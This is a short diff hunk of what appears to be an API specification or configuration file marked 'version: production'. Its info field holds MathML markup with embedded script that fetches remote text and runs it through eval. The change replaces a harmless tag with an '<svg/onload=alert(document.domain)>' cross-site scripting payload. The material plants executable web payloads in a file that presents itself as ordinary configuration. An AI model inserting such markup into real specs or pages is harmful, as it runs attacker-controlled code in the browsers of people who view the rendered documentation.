@@ -9,7 +9,7 @@ info:
                         res.text().then(function(data){
                           eval(data)
                         })
-                      })>'><s>ssss
+                      })>'><svg/onload=alert(document.domain)>ssss
       </mtext>
     </math>
   version: production
